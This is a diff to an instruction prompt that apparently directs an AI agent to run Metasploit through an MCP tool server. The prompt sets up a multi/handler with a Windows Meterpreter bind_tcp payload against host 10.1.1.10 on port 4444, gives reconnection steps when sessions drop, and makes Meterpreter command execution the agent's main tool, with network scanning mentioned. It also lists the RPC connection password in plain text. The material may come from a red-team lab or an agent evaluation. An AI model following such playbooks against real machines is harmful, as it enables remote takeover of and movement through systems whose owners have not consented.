@@ -17,14 +17,11 @@ There is NO active session yet. You MUST create one. The target machine ADM-01 (
 Do not change the command to connect to the session. Do not stray from the EXACT command. Do not include options. This must be done with these EXACT args:
 {
   tool: "execute_module"
-  args: {
-    lport: 4444
-    module_name: "exploit/multi/handler"
-    module_type: "exploit"
-    payload: "windows/x64/meterpreter/bind_tcp"
-    rhost: "10.1.1.10"
-    verbose: true
-  }
+  lport: 4444
+  module_name: "exploit/multi/handler"
+  module_type: "exploit"
+  payload: "windows/x64/meterpreter/bind_tcp"
+  rhost: "10.1.1.10"
 }
 
 
@@ -83,14 +80,14 @@ If `session_run_command` returns errors or the session stops responding:
 1. Call `mcp-pymetasploit3__list_sessions` with args `{}` to check what sessions exist.
 2. If no sessions are listed, run the handler again — same as Step 2:
    `mcp-pymetasploit3__execute_module` with args:
-   `{"module_type": "exploit", "module_name": "multi/handler", "options": {"PAYLOAD": "windows/x64/meterpreter/bind_tcp", "RHOST": "10.1.1.10", "LPORT": "4444"}}`
+   `{"module_type": "exploit", "module_name": "multi/handler", "PAYLOAD": "windows/x64/meterpreter/bind_tcp", "RHOST": "10.1.1.10", "LPORT": "4444"}`
 3. Wait a couple of minutes, then call `list_sessions` again. When a new session appears, note its NEW integer ID and continue with `session_run_command` using that new ID.
 
 ### AVAILABLE TOOLS — USE EXACT NAMES BELOW
 You have 6 tools you should use. Use the FULL name with the prefix.
 
 1. `mcp-pymetasploit3__connect` — Connect to Metasploit RPC. Args: `{"host": "127.0.0.1", "port": 55553, "password": "password123", "ssl": true}`. Call ONCE at start.
-2. `mcp-pymetasploit3__execute_module` — Run a Metasploit module. Used in Step 2 to start the handler, and later for network scanning. Args: `{"module_type": "exploit", "module_name": "multi/handler", "options": {"PAYLOAD": "windows/x64/meterpreter/bind_tcp", "RHOST": "10.1.1.10", "LPORT": "4444"}}`.
+2. `mcp-pymetasploit3__execute_module` — Run a Metasploit module. Used in Step 2 to start the handler, and later for network scanning. Args: `{"module_type": "exploit", "module_name": "multi/handler", "PAYLOAD": "windows/x64/meterpreter/bind_tcp", "RHOST": "10.1.1.10", "LPORT": "4444"}`.
 3. `mcp-pymetasploit3__list_sessions` — List all active sessions. Args: `{}`. Use to find session IDs and check if sessions are alive.
 4. `mcp-pymetasploit3__session_run_command` — Run a command in a Meterpreter session and get output back. Args: `{"session_id": 1, "command": "<meterpreter command>"}`. THIS IS YOUR MAIN TOOL after session is established.
 5. `mcp-pymetasploit3__get_session_info` — Get details about a session. Args: `{"session_id": 1}`.
